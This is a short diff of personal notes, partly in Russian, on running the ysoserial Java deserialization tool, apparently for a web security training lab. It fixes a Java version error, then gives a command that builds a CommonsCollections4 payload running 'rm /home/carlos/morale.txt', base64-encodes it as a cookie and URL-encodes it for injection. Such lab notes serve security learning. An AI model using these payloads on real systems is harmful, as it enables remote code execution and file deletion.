@@ -1,0 +1,23 @@
+java -jar ysoserial-all.jar 
+Y SO SERIAL?
+Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
+  Available payload types:
+
+ошибка в версии java 
+
+https://github.com/frohoff/ysoserial/issues/203
+    Install java 11
+    sudo apt-get install openjdk-11-jdk
+    Add Java 11 to PATH variable. To add the Java 11 installation directory to the PATH variable, you can open the .bashrc or .bash_profile file in your home directory using a text editor. For example, you can use the following command to open the .bashrc file:
+    nano ~/.bashrc
+    In the open file, add the following line to the end:
+    export PATH="/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH"
+    Save and exit nano
+    Restart the terminal with the following command
+    source ~/.bashrc
+    Execute ysoserial. Example:
+    java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookieTouse.txt       
+    You should see the following output on the first line:
+    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+
+Вставляем  payload url encode all characters 
